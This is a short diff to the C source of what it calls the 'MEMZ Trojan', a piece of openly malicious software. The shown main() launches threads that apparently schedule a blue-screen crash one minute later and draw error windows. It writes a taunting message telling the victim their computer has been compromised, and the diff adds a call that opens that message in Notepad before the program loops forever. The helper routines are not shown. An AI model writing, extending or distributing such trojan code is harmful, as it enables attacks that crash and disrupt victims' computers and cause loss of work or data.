@@ -106,7 +106,8 @@ int main(void) {
  	CreateThread(NULL, 4096, &CallBsod1MinLater, NULL, NULL, NULL);
  	CreateThread(NULL, 4096, &DrawErrors, NULL, NULL, NULL);
  	FILE *p=freopen("Fuckyou.txt","w",stdout);
- 	printf("Your computer has been fucked by MEMZ Trojan.:-)\nSo use your computer as long as you can!:-)\n");
+ 	printf("Your computer has been fucked by MEMZ Trojan.\n:)\nSo use it as long as you can!\n:D\n");
  	fclose(p);
+ 	system("notepad.exe Fuckyou.txt");
 	while(true);
 }
